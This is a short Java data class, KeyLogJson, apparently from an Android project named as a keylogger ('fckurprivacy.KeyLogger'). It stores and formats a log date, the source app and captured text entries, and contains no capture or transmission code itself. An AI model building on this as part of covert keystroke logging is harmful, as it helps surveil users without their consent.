package com.vergermiya.harevost.fckurprivacy.KeyLogger;

import java.util.ArrayList;

/**
 * Created by harevost on 18-7-18.
 */

public class KeyLogJson {

    private String logDate;
    private String logApp;
    private ArrayList<String> logData;

    public KeyLogJson(String logDate, String logApp, ArrayList<String> logData) {
        this.logDate = logDate;
        this.logApp = logApp;
        this.logData = logData;
    }

    public String getLogDate() { return logDate; }
    public String getLogApp() { return logApp; }
    public ArrayList<String> getLogData() { return logData; }

    @Override
    public String toString() {
        String logDataStr = "";
        for (String data : logData) {
            logDataStr += ("|" + data.replace(" ", "_") + "|");
        }
        return new String().format("KeyLog {" + "Date=%s" + "APP=%s" + "Data=%s}", logDate, logApp, logDataStr);
    }



}
